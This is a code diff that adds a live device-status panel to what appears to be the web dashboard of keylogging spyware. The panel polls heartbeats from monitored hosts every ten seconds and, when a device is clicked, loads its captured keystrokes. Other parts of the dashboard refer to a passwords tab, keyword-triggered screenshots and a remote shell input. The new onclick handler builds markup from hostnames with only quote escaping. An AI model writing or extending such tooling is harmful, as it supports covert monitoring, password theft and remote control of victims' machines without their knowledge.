@@ -31,6 +31,10 @@
     .tab-btn:not(.active):hover { background: #1e293b; color: #94a3b8; }
     .tab-content { display: none; }
     .tab-content.active { display: block; }
+    .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 4px; }
+    .dot-alive { background: #34d399; box-shadow: 0 0 6px rgba(52,211,153,0.5); }
+    .dot-warn { background: #fbbf24; box-shadow: 0 0 6px rgba(251,191,36,0.5); }
+    .dot-dead { background: #f87171; box-shadow: 0 0 6px rgba(248,113,113,0.5); }
     .screenshot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 16px; }
     .screenshot-card { background: #1e293b; border: 1px solid #334155; border-radius: 8px; overflow: hidden; transition: border-color 0.2s; }
     .screenshot-card:hover { border-color: #34d399; }
@@ -78,6 +82,11 @@
         <button class="px-4 py-2 text-sm font-medium text-slate-300 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded-lg transition" onclick="showAliasModal()">Manage Aliases</button>
       </div>
     </section>
+
+    <div id="deviceStatus" class="flex flex-wrap items-center gap-3 px-1 py-2 text-xs">
+      <span class="text-slate-500 font-medium">Devices:</span>
+      <span class="text-slate-600">No heartbeats yet</span>
+    </div>
 
     <div class="flex gap-2 border-b border-slate-800 pb-1">
       <button class="tab-btn active" onclick="switchTab('activity', this)">Activity</button>
@@ -458,6 +467,34 @@ function switchTab(tab, btn) {
   if (tab === 'passwords') fetchPasswords();
 }
 
+async function fetchHeartbeat() {
+  try {
+    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/heartbeat?select=hostname,last_seen,version&order=hostname.asc'));
+    if (!res.ok) return;
+    const data = await res.json();
+    const container = document.getElementById('deviceStatus');
+    if (!data || data.length === 0) {
+      container.innerHTML = '<span class="text-slate-500 font-medium">Devices:</span> <span class="text-slate-600">No heartbeats yet</span>';
+      return;
+    }
+    const now = Date.now();
+    let html = '<span class="text-slate-500 font-medium">Devices:</span>';
+    for (const row of data) {
+      const host = row.hostname || 'unknown';
+      const lastSeen = row.last_seen ? new Date(row.last_seen).getTime() : 0;
+      const diffMin = (now - lastSeen) / 60000;
+      let cls = 'dot-dead';
+      if (diffMin < 2) cls = 'dot-alive';
+      else if (diffMin < 5) cls = 'dot-warn';
+      const ver = row.version != null ? 'v' + row.version : '';
+      const ts = row.last_seen ? new Date(row.last_seen).toLocaleString() : 'never';
+      html += '<span class="inline-flex items-center cursor-pointer hover:text-emerald-400 transition" onclick="document.getElementById(\'hostnameInput\').value=\'' + host.replace(/'/g, "\\'") + '\';fetchKeys(true)" title="Last seen: ' + ts + ' | ' + ver + '">'
+        + '<span class="dot ' + cls + '"></span>' + escapeHtml(displayHost(host)) + '</span>';
+    }
+    container.innerHTML = html;
+  } catch (_) {}
+}
+
 async function fetchTriggers() {
   try {
     const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/screenshot_triggers?select=id,keyword&order=id.asc'));
@@ -699,6 +736,8 @@ document.getElementById('shellInput').addEventListener('keydown', (e) => {
 window.addEventListener('DOMContentLoaded', () => {
   populateHostnames();
   fetchKeys(true);
+  fetchHeartbeat();
+  setInterval(fetchHeartbeat, 10000);
   refreshInterval = setInterval(() => {
     if (currentTab === 'activity') { fetchKeys(); populateHostnames(); }
     else if (currentTab === 'screenshots') fetchScreenshots();
